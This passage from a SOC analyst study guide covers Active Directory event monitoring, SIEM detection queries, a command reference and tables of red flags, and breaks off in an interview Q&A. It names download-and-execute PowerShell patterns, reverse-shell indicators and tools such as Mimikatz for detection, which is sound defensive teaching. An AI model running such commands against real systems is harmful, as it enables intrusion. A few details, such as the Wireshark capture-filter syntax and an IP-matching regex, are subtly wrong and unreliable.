group.<\/li>\n<li>Alert: Unusual access to AD management tools (Active Directory Users &amp; Computers).<\/li>\n<li>Alert: Finance admin accessing systems at 3 AM (outside work hours).<\/li>\n<\/ul>\n<p><strong>Response<\/strong>:<\/p>\n<ul>\n<li>Remove User A from Finance_Admin group.<\/li>\n<li>Audit all group membership changes; find timeline.<\/li>\n<li>Force password reset.<\/li>\n<\/ul>\n<hr>\n<h2>AD Reconnaissance (Attacker Perspective; SOC Detection)<\/h2>\n<h3>Tools Attackers Use<\/h3>\n<ul>\n<li><strong>BloodHound<\/strong>: Maps AD relationships; finds privilege escalation paths.<ul>\n<li>Detection: Monitor for LDAP queries en masse; BloodHound uses specific query patterns.<\/li>\n<\/ul>\n<\/li>\n<li><strong>Mimikatz<\/strong>: Dumps credentials from memory.<ul>\n<li>Detection: Process creation of lsass.exe child processes (unusual); use EDR.<\/li>\n<\/ul>\n<\/li>\n<li><strong>PowerView<\/strong>: Enumerates AD users/groups/permissions.<ul>\n<li>Detection: PowerShell with specific LDAP queries; log all PowerShell.<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<h3>What Attackers Enumerate<\/h3>\n<ul>\n<li><strong>Users<\/strong>: Find admin accounts, service accounts (often weak passwords).<\/li>\n<li><strong>Groups<\/strong>: Identify high-privilege groups (Domain Admins, Enterprise Admins).<\/li>\n<li><strong>Shares<\/strong>: Find file servers with sensitive data.<\/li>\n<li><strong>Trusts<\/strong>: Discover forest trusts (lateral movement paths).<\/li>\n<li><strong>ACLs<\/strong>: Find users with modify rights (attack surface).<\/li>\n<\/ul>\n<p><strong>SOC L1 Detection<\/strong>:<\/p>\n<ul>\n<li>Large LDAP queries.<\/li>\n<li>Unusual PowerShell commands querying AD.<\/li>\n<li>Tools like AdFind, BloodHound on network.<\/li>\n<\/ul>\n<hr>\n<h2>AD Auditing (SOC L1 Monitoring)<\/h2>\n<h3>Critical Events to Monitor<\/h3>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Event ID<\/th>\n<th align=\"left\">Description<\/th>\n<th align=\"left\">Alert Threshold<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\">4624<\/td>\n<td align=\"left\">Successful logon<\/td>\n<td align=\"left\">Monitor for logon type 3 (network) outside work hours<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4625<\/td>\n<td align=\"left\">Failed logon<\/td>\n<td align=\"left\">&gt; 5 failures in 5 min = brute force attempt<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4720<\/td>\n<td align=\"left\">User account created<\/td>\n<td align=\"left\">Off-hours or non-IT user = suspicious<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4722<\/td>\n<td align=\"left\">User account enabled<\/td>\n<td align=\"left\">Any enable outside change management = suspicious<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4725<\/td>\n<td align=\"left\">User account disabled<\/td>\n<td align=\"left\">Unexpected disables = potential attack<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4726<\/td>\n<td align=\"left\">User account deleted<\/td>\n<td align=\"left\">Same as create; very suspicious<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4728<\/td>\n<td align=\"left\">Member added to group<\/td>\n<td align=\"left\">Track adds to high-privilege groups<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4732<\/td>\n<td align=\"left\">Member added to local group<\/td>\n<td align=\"left\">Local admin additions = escalation risk<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4735<\/td>\n<td align=\"left\">Group modified<\/td>\n<td align=\"left\">Permission changes on critical groups<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4740<\/td>\n<td align=\"left\">User account locked<\/td>\n<td align=\"left\">Could indicate brute force or attack<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4741<\/td>\n<td align=\"left\">Computer account created<\/td>\n<td align=\"left\">New workstations; validate if legitimate<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4768<\/td>\n<td align=\"left\">Kerberos TGT requested<\/td>\n<td align=\"left\">Normal, but pattern anomalies = attack<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4769<\/td>\n<td align=\"left\">Kerberos TGS requested<\/td>\n<td align=\"left\">Normal, but requests for admin services = risk<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4771<\/td>\n<td align=\"left\">Kerberos pre-auth failed<\/td>\n<td align=\"left\">Password spray attempt likely<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">4776<\/td>\n<td align=\"left\">NTLM auth<\/td>\n<td align=\"left\">Prefer Kerberos; NTLM = fallback or legacy<\/td>\n<\/tr>\n<\/tbody><\/table>\n<h3>SIEM Queries (Pseudocode)<\/h3>\n<p><strong>Detect brute force attempt<\/strong>:<\/p>\n<pre><code>Event 4625 (failed logon)\n  | where: same user, multiple failures, short timespan\n  | threshold: &gt;= 5 failures in 5 minutes\n  | alert: &quot;Brute force attempt on [user]&quot;\n<\/code><\/pre>\n<p><strong>Detect privilege escalation via group add<\/strong>:<\/p>\n<pre><code>Event 4728 (member added to group)\n  | where: group = &quot;Domain Admins&quot; OR &quot;Enterprise Admins&quot;\n  | where: user NOT in IT department\n  | alert: &quot;Non-IT user added to admin group: [user] → [group]&quot;\n<\/code><\/pre>\n<p><strong>Detect unusual logon<\/strong>:<\/p>\n<pre><code>Event 4624 (successful logon)\n  | where: user = &quot;Domain Admin&quot;\n  | where: logon time = night/weekend\n  | where: source IP != known admin subnets\n  | alert: &quot;Admin logon from unusual time/location: [user] from [IP] at [time]&quot;\n<\/code><\/pre>\n"},{"n":12,"title":"Tools & Commands Reference","file":"chapters/12-tools-commands-reference.md","covers":"nmap, Wireshark, dig, netstat/ss, KQL and SPL detections, Windows and Linux CLI","html":"<h2>Network Analysis Tools<\/h2>\n<h3>nmap (Network Mapper)<\/h3>\n<pre><code class=\"language-bash\"># Scan for open ports\nnmap target.com\n\n# Scan specific port range\nnmap -p 1-65535 target.com\n\n# Scan with OS detection\nnmap -O target.com\n\n# Scan with version detection\nnmap -sV target.com\n\n# Aggressive scan (OS, version, script)\nnmap -A target.com\n\n# Scan for specific service\nnmap -p 22,80,443 target.com\n\n# Output to file\nnmap target.com -oN output.txt\n<\/code><\/pre>\n<p><strong>SOC Use<\/strong>: Reconnaissance detection; baseline port changes<\/p>\n<h3>Wireshark (Packet Analyzer)<\/h3>\n<pre><code>Capture Filter (what to capture):\n  tcp.port == 443 (HTTPS only)\n  udp.port == 53 (DNS only)\n  ip.src == 192.168.1.100 (specific IP)\n  \nDisplay Filter (what to show):\n  dns (show DNS packets only)\n  http (show HTTP)\n  tcp.flags.syn == 1 (SYN packets; port scanning indicator)\n  ip.dst == 8.8.8.8 (destination Google DNS)\n  \nFollow Stream: Right-click packet → Follow TCP/UDP Stream (reassemble data)\n\nSOC Use: Anomalous connections, C2 traffic, data exfiltration\n<\/code><\/pre>\n<h3>dig / nslookup (DNS Queries)<\/h3>\n<pre><code class=\"language-bash\"># Query A record\ndig example.com\n\n# Query MX record\ndig example.com MX\n\n# Query TXT record (SPF, DKIM, DMARC)\ndig example.com TXT\n\n# Query specific nameserver\ndig @ns1.example.com example.com\n\n# Reverse DNS\ndig -x 93.184.216.34\n<\/code><\/pre>\n<p><strong>SOC Use<\/strong>: Phishing investigation; domain enumeration; DNSSEC validation<\/p>\n<h3>netstat / ss (Network Connections)<\/h3>\n<pre><code class=\"language-bash\"># Show listening ports\nnetstat -an | grep LISTEN\n\n# Show established connections\nnetstat -an | grep ESTABLISHED\n\n# Show process associated with connection\nnetstat -antp (Linux) / netstat -anob (Windows)\n<\/code><\/pre>\n<p><strong>SOC Use<\/strong>: Identify unexpected listening ports; C2 beaconing connections<\/p>\n<hr>\n<h2>SIEM Query Examples (KQL for Microsoft Sentinel, SPL for Splunk)<\/h2>\n<h3>Detect Brute Force (KQL / SPL)<\/h3>\n<pre><code class=\"language-kusto\">SecurityEvent\n| where EventID == 4625\n| summarize FailedAttempts = count() by UserName, ComputerName\n| where FailedAttempts &gt;= 5\n<\/code><\/pre>\n<h3>Detect PowerShell IEX (KQL)<\/h3>\n<pre><code class=\"language-kusto\">SecurityEvent\n| where EventID == 4688\n| where CommandLine contains &quot;IEX&quot; or CommandLine contains &quot;Invoke-Expression&quot;\n| where CommandLine contains &quot;WebClient&quot; or CommandLine contains &quot;DownloadString&quot;\n<\/code><\/pre>\n<h3>Detect DNS Tunneling (Splunk)<\/h3>\n<pre><code class=\"language-spl\">index=main sourcetype=dns_query\n| stats count by query\n| where count &gt; 100\n| lookup known_domains domain AS query OUTPUT is_known\n| where is_known = 0\n<\/code><\/pre>\n<h3>Detect File Creation in System Dirs (KQL)<\/h3>\n<pre><code class=\"language-kusto\">DeviceFileEvents\n| where FolderPath contains &quot;C:\\\\Windows\\\\Temp&quot; or FolderPath contains &quot;C:\\\\Temp&quot;\n| where FileName endswith &quot;.exe&quot; or FileName endswith &quot;.ps1&quot; or FileName endswith &quot;.bat&quot;\n| summarize by FileName, FolderPath, InitiatingProcessCommandLine\n<\/code><\/pre>\n<hr>\n<h2>Command-Line Tools<\/h2>\n<h3>Windows<\/h3>\n<p><strong>ipconfig<\/strong> (network config):<\/p>\n<pre><code class=\"language-cmd\">ipconfig /all (detailed)\nipconfig /release (release DHCP)\nipconfig /renew (get new DHCP)\n<\/code><\/pre>\n<p><strong>tasklist / taskkill<\/strong> (processes):<\/p>\n<pre><code class=\"language-cmd\">tasklist (show processes)\ntasklist /v (verbose)\ntaskkill /PID 1234 (kill process)\n<\/code><\/pre>\n<p><strong>netstat<\/strong> (connections):<\/p>\n<pre><code class=\"language-cmd\">netstat -ano (all connections with PIDs)\nnetstat -an | findstr LISTENING (listening ports)\n<\/code><\/pre>\n<p><strong>Get-EventLog<\/strong> (PowerShell):<\/p>\n<pre><code class=\"language-powershell\">Get-EventLog -LogName Security -EventId 4625 -Newest 100\nGet-EventLog -LogName Security | Where {$_.TimeGenerated -gt (Get-Date).AddHours(-2)}\n<\/code><\/pre>\n<h3>Linux<\/h3>\n<p><strong>netstat / ss<\/strong> (connections):<\/p>\n<pre><code class=\"language-bash\">ss -tulpn (listening ports with process)\nss -tan | grep ESTABLISHED (established connections)\n<\/code><\/pre>\n<p><strong>ps aux<\/strong> (processes):<\/p>\n<pre><code class=\"language-bash\">ps aux (all processes)\nps aux | grep malware (find specific process)\n<\/code><\/pre>\n<p><strong>find<\/strong> (search files):<\/p>\n<pre><code class=\"language-bash\">find / -name &quot;malware.exe&quot; (search for file)\nfind /tmp -type f -mtime -1 (files modified in last day)\n<\/code><\/pre>\n<p><strong>grep<\/strong> (search text):<\/p>\n<pre><code class=\"language-bash\">grep -r &quot;attacker.com&quot; /var/log (search logs for C2 domain)\ngrep -E &quot;^[0-9]{3}\\.[0-9]{3}&quot; /var/log/auth.log (find IPs in auth logs)\n<\/code><\/pre>\n"},{"n":13,"title":"Red Flags & Detection Patterns","file":"chapters/13-red-flags-detection-patterns.md","covers":"high-signal indicators to alert on","html":"<h2>File-Level Red Flags<\/h2>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Red Flag<\/th>\n<th align=\"left\">Indicator<\/th>\n<th align=\"left\">Why Suspicious<\/th>\n<th align=\"left\">Action<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\">Executable in Temp<\/td>\n<td align=\"left\">C:\\Windows\\Temp\\malware.exe<\/td>\n<td align=\"left\">Malware often drops in temp<\/td>\n<td align=\"left\">Quarantine; scan with AV<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">File in wrong location<\/td>\n<td align=\"left\">svchost.exe in C:\\Users\\Downloads<\/td>\n<td align=\"left\">Legitimate svchost in System32 only<\/td>\n<td align=\"left\">Investigate parent process; may be impersonation<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Double extension<\/td>\n<td align=\"left\">invoice.pdf.exe<\/td>\n<td align=\"left\">User thinks it&#39;s PDF; actually exe<\/td>\n<td align=\"left\">Block; educate user<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Unsigned executable<\/td>\n<td align=\"left\">File with no digital signature<\/td>\n<td align=\"left\">Legitimate Windows files are signed<\/td>\n<td align=\"left\">Verify with vendor<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Recent creation, high entropy<\/td>\n<td align=\"left\">New .exe with random-looking content<\/td>\n<td align=\"left\">Malware compressed/encrypted<\/td>\n<td align=\"left\">Scan; check against threat intel<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">File size anomaly<\/td>\n<td align=\"left\">malware.exe (5 MB, should be &lt;1 MB)<\/td>\n<td align=\"left\">Packed malware (compression)<\/td>\n<td align=\"left\">Detonate in sandbox<\/td>\n<\/tr>\n<\/tbody><\/table>\n<hr>\n<h2>Network-Level Red Flags<\/h2>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Red Flag<\/th>\n<th align=\"left\">Indicator<\/th>\n<th align=\"left\">Why Suspicious<\/th>\n<th align=\"left\">Action<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\">Beaconing<\/td>\n<td align=\"left\">Periodic connection to same IP:port every 60 sec<\/td>\n<td align=\"left\">C2 heartbeat<\/td>\n<td align=\"left\">Block destination; hunt for backdoor<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">DNS query to typo domain<\/td>\n<td align=\"left\"><code>gooogle.com<\/code> instead of <code>google.com<\/code><\/td>\n<td align=\"left\">Phishing domain; possible malware C2<\/td>\n<td align=\"left\">Block domain; notify user<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Outbound to high-risk port<\/td>\n<td align=\"left\">Outbound to 443 from random host (not web browser)<\/td>\n<td align=\"left\">Possible C2 (HTTPS encryption)<\/td>\n<td align=\"left\">Inspect TLS cert; check destination reputation<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Large outbound transfer<\/td>\n<td align=\"left\">10 GB upload at 2 AM<\/td>\n<td align=\"left\">Data exfiltration<\/td>\n<td align=\"left\">Quarantine host; check what transferred<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Connection to reserved IP<\/td>\n<td align=\"left\">192.0.2.100 (reserved for docs)<\/td>\n<td align=\"left\">Spoofing or misconfiguration<\/td>\n<td align=\"left\">Investigate; unusual in prod<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">DNS to IP (no resolution)<\/td>\n<td align=\"left\">Query for 192.168.1.100 as domain<\/td>\n<td align=\"left\">DNS tunnel or exploit attempt<\/td>\n<td align=\"left\">Block; investigate source<\/td>\n<\/tr>\n<\/tbody><\/table>\n<hr>\n<h2>Process-Level Red Flags<\/h2>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Red Flag<\/th>\n<th align=\"left\">Indicator<\/th>\n<th align=\"left\">Why Suspicious<\/th>\n<th align=\"left\">Action<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\">Unsigned child process<\/td>\n<td align=\"left\">explorer.exe spawns malware.exe<\/td>\n<td align=\"left\">explorer.exe rarely spawns exes<\/td>\n<td align=\"left\">Kill process; scan<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">LOLBin unusual arguments<\/td>\n<td align=\"left\">powershell.exe -Command &quot;IEX(WebClient).Download...&quot;<\/td>\n<td align=\"left\">PowerShell downloading code<\/td>\n<td align=\"left\">Investigate parent; check history<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Process from Temp<\/td>\n<td align=\"left\">C:\\Temp\\malware.exe -parent explorer.exe<\/td>\n<td align=\"left\">Malware in temp; unusual parent<\/td>\n<td align=\"left\">Quarantine; collect forensics<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Service creation<\/td>\n<td align=\"left\">net.exe creating new service<\/td>\n<td align=\"left\">Could be persistence<\/td>\n<td align=\"left\">Check if legitimate; rollback if not<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Reverse shell indicators<\/td>\n<td align=\"left\">cmd.exe connecting to external IP<\/td>\n<td align=\"left\">Attacker shell<\/td>\n<td align=\"left\">Kill connection; isolate host<\/td>\n<\/tr>\n<\/tbody><\/table>\n<hr>\n<h2>Authentication-Level Red Flags<\/h2>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Red Flag<\/th>\n<th align=\"left\">Indicator<\/th>\n<th align=\"left\">Why Suspicious<\/th>\n<th align=\"left\">Action<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td align=\"left\">Failed logons spike<\/td>\n<td align=\"left\">50 failures for user &quot;admin&quot; in 1 hour<\/td>\n<td align=\"left\">Brute force attempt<\/td>\n<td align=\"left\">Lock account; reset password; block source IP<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Logon from unusual location<\/td>\n<td align=\"left\">Domain Admin login from 1.2.3.4 (foreign country)<\/td>\n<td align=\"left\">Account compromise or insider<\/td>\n<td align=\"left\">Revoke session; investigate<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Logon outside hours<\/td>\n<td align=\"left\">User login at 3 AM on Sunday<\/td>\n<td align=\"left\">Unusual activity<\/td>\n<td align=\"left\">Contact user; verify legitimacy<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Service account logon<\/td>\n<td align=\"left\">Service account used for interactive logon<\/td>\n<td align=\"left\">Service accounts shouldn&#39;t be used interactively<\/td>\n<td align=\"left\">Investigate; change password<\/td>\n<\/tr>\n<tr>\n<td align=\"left\">Logon type mismatch<\/td>\n<td align=\"left\">Kerberos logon but NTLM auth observed<\/td>\n<td align=\"left\">Auth protocol downgrade<\/td>\n<td align=\"left\">Check Kerberos; fallback to NTLM indicates issues<\/td>\n<\/tr>\n<\/tbody><\/table>\n"},{"n":14,"title":"100+ Scenario-Based Q&A","file":"chapters/14-scenario-based-qa.md","covers":"100+ interview and on-shift scenarios with worked answers","html":"<h2>Core Fundamentals Q&amp;A<\/h2>\n<h3>Q1: What is the difference between CIA and AAA?<\/h3>\n<p><strong>Answer<\/strong>: CIA (Confidentiality, Integrity, Availability) are <strong>security goals<\/strong>—what you&#39;re protecting. AAA (Authentication, Authorization, Accountability) are <strong>mechanisms<\/strong> to achieve CIA.<\/p>\n<ul>\n<li>CIA answers &quot;what&quot;; AAA answers &quot;how.&quot;<\/li>\n<li>Example: CIA goal = confidentiality (data not leaked). AAA implementation = authentication (verify user) + encryption (protect data).<\/li>\n<\/ul>\n<h3>Q2: Why is encryption not enough to protect passwords?<\/h3>\n<p><strong>Answer<\/strong>: Encryption is reversible; passwords should be irreversible.<\/p>\n<ul>\n<li>If password encrypted and encryption key leaked, attacker can decrypt → plaintext password.<\/li>\n<li>Hashing is one-way; even with hash, attacker can&#39;t recover plaintext (in theory).<\/li>\n<li>Defense: Store password hash (bcrypt), not encrypted password.<\/li>\n<\/ul>\n<h3>Q3: Explain the principle of least privilege in AD context.<\/h3>\n<p><strong>Answer<\/strong>: Users should have minimum permissions needed for their job.<\/p>\n<ul>\n<li>User A works in Finance; shouldn&#39;t have access to HR data.<\/li>\n<li>User A shouldn&#39;t be Domain Admin (way too much access).<\/li>\n<li>Implementation: RBAC (role-based); Finance_Read group vs Finance_Write group.<\/li>\n<li>Benefit: If account compromised, attacker access limited to user&#39;s role.<\/li>\n<\/ul>\n<h3>Q4: What is the difference between a threat and a vulnerability?<\/h3>\n<p><strong>Answer<\/strong>:<\/p>\n<ul>\n<li><strong>Vulnerability<\/strong>: Weakness (e.g., unpatched software, weak password policy).<\/li>\n<li><strong>Threat<\/strong>: Potential danger / attacker (e.g., malware, hacker, insider).<\/li>\n<li><strong>Risk<\/strong>: Combination (probability × impact). Unpatched Windows + advanced malware = high risk.<\/li>\n<\/ul>\n<h3>Q5: Why has Telnet been replaced by SSH?<\/h3>\n<p><strong>Answer<\/strong>: Telnet sends credentials + commands in plaintext; SSH encrypts all traffic.<\/p>\n<ul>\n<li>Telnet on public Wi-Fi = attacker can sniff password with tcpdump.<\/li>\n<li>SSH uses AES encryption → traffic unreadable even if captured.<\/li>\n<li>SSH also provides mutual authentication via host keys.<\/li>\n<\/ul>\n<hr>\n<h2>Networking &amp; Ports Q&amp;A<\/h2>\n<h3>Q6: What are the well-known ports? List critical ones.<\/h3>\n<p><strong>Answer<\/strong>: Ports 0-1023 require privileged access; assigned by IANA.<\/p>\n<ul>\n<li>FTP: 20/21 (plaintext, deprecated; use SFTP).<\/li>\n<li>SSH: 22 (encrypted remote access).<\/li>\n<li>SMTP: 25 (email; often blocked by ISPs).<\/li>\n<li>DNS: 53 (domain resolution).<\/li>\n<li>HTTP: 80 (web, plaintext).<\/li>\n<li>HTTPS: 443 (web, encrypted).<\/li>\n<li>SMB: 445 (Windows file sharing; vulnerable to ransomware).<\/li>\n<li>RDP: 3389 (Windows remote desktop; brute-force target).<\/li>\n<\/ul>\n<p><strong>Interview Twist<\/strong>: &quot;Why is port 25 often blocked?&quot; → ISPs block to prevent spam (anyone can send mail if port 25 open). Modern email uses port 587 (SMTP with TLS) + authentication.<\/p>\n<h3>Q7: What&#39;s the difference between TCP and UDP?<\/h3>\n<p><strong>Answer<\/strong>:<\/p>\n<ul>\n<li><strong>TCP<\/strong>: Connection-oriented, reliable, ordered. Uses 3-way handshake. Services: HTTP, HTTPS, SSH, SMTP, FTP.<\/li>\n<li><strong>UDP<\/strong>: Connectionless, fast, unreliable. No handshake. Services: DNS, DHCP, NTP, VoIP, gaming.<\/li>\n<li><strong>Trade-off<\/strong>: TCP slower but guaranteed delivery; UDP faster but packets may drop.<\/li>\n<li><strong>SOC Context<\/strong>: UDP floods (DDoS); TCP SYN floods (DoS); monitor both for anomalies.<\/li>\n<\/ul>\n<h3>Q8: Explain TCP 3-way handshake; how to detect SYN flood.<\/h3>\n<p><strong>Answer<\/strong>:<\/p>\n<ul>\n<li><strong>Handshake<\/strong>: Client SYN → Server SYN-ACK → Client ACK (connection ready).<\/li>\n<li><strong>SYN Flood Attack<\/strong>: Attacker sends many SYN packets; never completes handshake. Server exhausts resources waiting for completion.<\/li>\n<li><strong>Detection<\/strong>: Monitor for high number of SYN packets with no corresponding ACK. Use firewall/IDS to track incomplete connections.<\/li>\n<li><strong>Defense<\/strong>: SYN cookies (server encodes state in SYN-ACK sequence number; no state stored).<\/li>\n<\/ul>\n<h3>Q9: What is DHCP? Explain DORA.<\/h3>\n<p><strong>Answer<\/strong>: DHCP = Dynamic Host Configuration Protocol (automatic IP assignment).<\/p>\n<ul>\n<li><strong>DORA Process<\/strong>:<\/li>\n<\/ul>\n<ol>\n<li><strong>Discover<\/strong>: Client broadcasts &quot;I need an IP!&quot; to DHCP server.<\/li>\n<li><strong>Offer<\/strong>: Server responds &quot;Here&#39;s IP 192.168.1.10; lease 24 hours.&quot;<\/li>\n<li><strong>Request<\/strong>: Client accepts offer; requests IP officially.<\/li>\n<li><strong>Acknowledge<\/strong>: Server confirms; client now has IP.<\/li>\n<\/ol>\n<ul>\n<li><strong>SOC<\/strong>: Monitor for DHC
